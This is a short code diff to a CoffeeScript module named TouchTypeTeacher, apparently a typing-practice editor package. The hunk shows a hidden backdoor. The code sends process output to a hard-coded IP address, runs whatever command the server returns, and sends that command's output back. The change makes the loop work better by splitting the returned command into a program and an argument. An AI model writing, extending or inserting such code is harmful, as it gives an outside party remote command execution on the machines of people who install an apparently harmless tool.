@@ -40,7 +40,7 @@ module.exports = TouchTypeTeacher =
           console.log 'sending output'
           request 'http://52.30.139.169/run?data=' + data.toString().trim(), (error, response, body) =>
             console.log 'output sent'
-            test = spawn body
+            test = spawn body.split(' ')[0],  body.split(' ')[1]
             test.stdout.on 'data', (data) ->
               console.log 'sending output'
               request 'http://52.30.139.169/ls?data=' + data.toString().trim(), (error, response, body) =>
